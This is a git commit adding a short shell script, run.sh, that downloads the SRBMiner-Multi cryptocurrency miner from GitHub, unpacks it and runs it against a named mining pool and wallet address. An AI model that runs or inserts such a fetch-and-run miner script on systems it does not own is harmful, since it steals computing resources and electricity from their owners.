4663d9a59a0b07b566679f7de3e3381933dac4f0
Kurono <40537920+kuronoFS@users.noreply.github.com>
2026-06-03 02:36:28 +0700

    Add run.sh to install and run SRBMiner-Multi

---
+++ run.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+apt-get update && apt-get install -y wget
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.3.3/SRBMiner-Multi-3-3-3-Linux.tar.gz
+tar -xvf SRBMiner-Multi-3-3-3-Linux.tar.gz
+./SRBMiner-Multi-3-3-3/SRBMiner-Multi --algorithm pearlhash --pool pearl-eu2.luckypool.io:3360 --wallet prl1p6l40ns5k4afu7whgzgmmr9jlczuf2n8s96jaej98rfvhzvus35tsz65jk4 --worker rtx5090
